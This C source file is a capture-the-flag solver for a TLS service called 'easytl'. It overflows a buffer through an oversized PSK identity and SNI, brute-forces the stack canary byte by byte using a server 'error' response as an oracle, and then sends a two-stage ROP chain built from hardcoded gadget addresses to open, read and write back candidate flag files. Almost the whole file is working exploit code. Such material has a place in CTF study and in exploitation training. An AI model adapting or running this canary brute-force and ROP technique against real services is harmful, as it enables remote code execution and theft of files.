// easytl solve: brute canary via TLS alert oracle, then one-shot ROP per candidate flag path.
// build: gcc -O2 -o solve solve.c -lssl -lcrypto
// usage: ./solve <host> <port> [canary_hex]
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define POP_RDI     0x4251bdULL
#define POP_RSI     0x5e9a79ULL
#define POP_RDX     0x52f0d2ULL
#define POP_RAX     0x5f6c9aULL
#define POP_RBP     0x402262ULL
#define LEAVE_RET   0x402db9ULL
#define SYSCALL_RET 0x76e706ULL
#define READ_FUNC   0x793b30ULL
#define WRITE_FUNC  0x793c30ULL
#define CLOSE_FUNC  0x793800ULL
#define BSS         0x979000ULL

static unsigned char ID[2048];
static int ID_LEN;
static char SNI[400];
static unsigned char KNOWN[8];
static SSL_CTX *ctx;

static const unsigned char PSK[64] = {
    0x8b,0xd3,0xd0,0x2f,0x8a,0xc2,0xe2,0xa0,0x63,0x73,0x57,0x79,0xb0,0xa2,0xea,0x98,
    0x0d,0x0b,0xaa,0x08,0x31,0xed,0x9f,0xce,0x8b,0x81,0x25,0xd7,0x9a,0xf5,0x98,0xb5,
    0x13,0x82,0xd3,0x23,0x1b,0x15,0x63,0x4d,0xc4,0xe5,0xc5,0x1a,0xa1,0xe5,0x7a,0xfc,
    0x03,0x8b,0xbd,0xf1,0x12,0x17,0xb4,0x02,0x88,0x7a,0xd7,0x44,0xf7,0x37,0xe9,0x52
};
static const char MAGIC[33] = "1401518dc5d7641ccd41593a5d812410";

static int psk_cb(SSL *ssl, const EVP_MD *md, const unsigned char **id, size_t *idlen, SSL_SESSION **sess) {
    *id = ID;
    *idlen = (size_t)ID_LEN;
    SSL_SESSION *s = SSL_SESSION_new();
    if (!s) return 0;
    SSL_SESSION_set1_master_key(s, PSK, 64);
    SSL_SESSION_set_cipher(s, SSL_CIPHER_find(ssl, "\x13\x02"));
    SSL_SESSION_set_protocol_version(s, TLS1_3_VERSION);
    *sess = s;
    return 1;
}

static int tcp_connect(const char *host, const char *port) {
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;
    int fd = socket(res->ai_family, res->ai_socktype, 0);
    if (fd < 0) { freeaddrinfo(res); return -1; }
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) { close(fd); freeaddrinfo(res); return -1; }
    freeaddrinfo(res);
    return fd;
}

// one canary guess: valid PSK handshake, then close_notify -> info_cb overflow -> "error" oracle
static int try_guess(const char *host, const char *port, int k, int g) {
    memset(ID, 'B', sizeof(ID));
    memcpy(ID, MAGIC, 32);
    ID[32] = 0;
    for (int i = 0; i < k; i++) ID[0x58 + i] = KNOWN[i];
    ID[0x58 + k] = (unsigned char)g;
    ID_LEN = 0x59 + k;
    memset(SNI, 'A', ID_LEN);
    SNI[ID_LEN] = 0;

    int fd = tcp_connect(host, port);
    if (fd < 0) return -1;
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, SNI);
    int ok = 0;
    if (SSL_connect(ssl) == 1) {
        SSL_shutdown(ssl);
        struct timeval tv = {0, 250000};
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        unsigned char buf[8192];
        int n;
        while ((n = recv(fd, buf, sizeof(buf), 0)) > 0) {
            for (int i = 0; i + 5 <= n; i++)
                if (!memcmp(buf + i, "error", 5)) { ok = 1; break; }
            if (ok) break;
        }
    }
    SSL_free(ssl);
    close(fd);
    return ok;
}

static void put64(unsigned char *p, unsigned long long v) { memcpy(p, &v, 8); }

// stage2 (0x100 bytes, one TCP segment): close(3); open(path); read(3); write(4)
static void build_stage2(unsigned char *b, const char *path) {
    memset(b, 0, 0x100);
    int i = 8;
    put64(b + i, POP_RDI); put64(b + i + 8, 3); put64(b + i + 16, CLOSE_FUNC); i += 24;
    unsigned long long str = BSS + 0xe0;
    put64(b + i, POP_RAX); put64(b + i + 8, 2);
    put64(b + i + 16, POP_RDI); put64(b + i + 24, str);
    put64(b + i + 32, POP_RSI); put64(b + i + 40, 0);
    put64(b + i + 48, POP_RDX); put64(b + i + 56, 0);
    put64(b + i + 64, SYSCALL_RET); i += 72;
    put64(b + i, POP_RDI); put64(b + i + 8, 3);
    put64(b + i + 16, POP_RSI); put64(b + i + 24, BSS + 0x300);
    put64(b + i + 32, POP_RDX); put64(b + i + 40, 0x100);
    put64(b + i + 48, READ_FUNC); i += 56;
    put64(b + i, POP_RDI); put64(b + i + 8, 4);
    put64(b + i + 16, POP_RSI); put64(b + i + 24, BSS + 0x300);
    put64(b + i + 32, POP_RDX); put64(b + i + 40, 0x100);
    put64(b + i + 48, WRITE_FUNC); i += 56;
    strcpy((char *)b + 0xe0, path);
}

// try one path: overflow -> read stage2 -> open(path) -> read -> write to socket
static int try_path(const char *host, const char *port, const unsigned char canary[8], const char *path, char *out, int outmax) {
    unsigned char st2[0x100];
    build_stage2(st2, path);

    memset(ID, 'B', sizeof(ID));
    memcpy(ID, MAGIC, 32);
    ID[32] = 0;
    memcpy(ID + 0x58, canary, 8);
    unsigned long long *q = (unsigned long long *)(ID + 0x60);
    q[0] = 0x4242424242424242ULL;
    int n = 1;
    q[n++] = POP_RDI; q[n++] = 4;
    q[n++] = POP_RSI; q[n++] = BSS;
    q[n++] = POP_RDX; q[n++] = 0x100;
    q[n++] = READ_FUNC;
    q[n++] = POP_RBP; q[n++] = BSS;
    q[n++] = LEAVE_RET;
    ID_LEN = 0x60 + n * 8;
    memset(SNI, 'A', ID_LEN);
    SNI[ID_LEN] = 0;

    int fd = tcp_connect(host, port);
    if (fd < 0) return 0;
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, SNI);
    if (SSL_connect(ssl) != 1) { SSL_free(ssl); close(fd); return 0; }
    SSL_shutdown(ssl);
    usleep(300000);
    send(fd, st2, sizeof(st2), MSG_NOSIGNAL);
    struct timeval tv = {2, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    unsigned char buf[4096];
    int total = 0, r;
    while ((r = recv(fd, buf, sizeof(buf), 0)) > 0 && total < outmax - 1) {
        for (int i = 0; i < r && total < outmax - 1; i++) {
            unsigned char c = buf[i];
            out[total++] = (c >= 32 && c < 127) ? c : '.';
        }
    }
    out[total] = 0;
    SSL_free(ssl);
    close(fd);
    return total;
}

int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s host port [canary_hex]\n", argv[0]); return 2; }
    const char *host = argv[1], *port = argv[2];
    SSL_library_init();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return 1;
    SSL_CTX_set_psk_use_session_callback(ctx, psk_cb);

    if (argc > 3 && strlen(argv[3]) == 16) {
        for (int i = 0; i < 8; i++) sscanf(argv[3] + 2 * i, "%2hhx", &KNOWN[i]);
        fprintf(stderr, "[+] canary = %s (skip brute)\n", argv[3]);
    } else {
        KNOWN[0] = 0x00;
        for (int k = 1; k < 8; k++) {
            int found = 0;
            for (int g = 0; g < 256 && !found; g++) {
                if (try_guess(host, port, k, g) == 1) {
                    KNOWN[k] = (unsigned char)g;
                    fprintf(stderr, "[+] canary[%d] = %02x\n", k, g);
                    found = 1;
                }
            }
            if (!found) { fprintf(stderr, "[-] brute failed at byte %d\n", k); return 1; }
        }
        fprintf(stderr, "[+] canary = ");
        for (int i = 0; i < 8; i++) fprintf(stderr, "%02x", KNOWN[i]);
        fprintf(stderr, "\n");
    }

    const char *paths[] = {"/flag", "flag", "/home/ctf/flag", "./flag", "/flag.txt"};
    char out[4096];
    for (int i = 0; i < 5; i++) {
        memset(out, 0, sizeof(out));
        try_path(host, port, KNOWN, paths[i], out, sizeof(out));
        char *p = memmem(out, strlen(out), "flag{", 5);
        if (p) {
            char *e = memchr(p, '}', strlen(p));
            if (e) e[1] = 0;
            printf("%s\n", p);
            return 0;
        }
    }
    fprintf(stderr, "[-] no flag found\n");
    return 1;
}
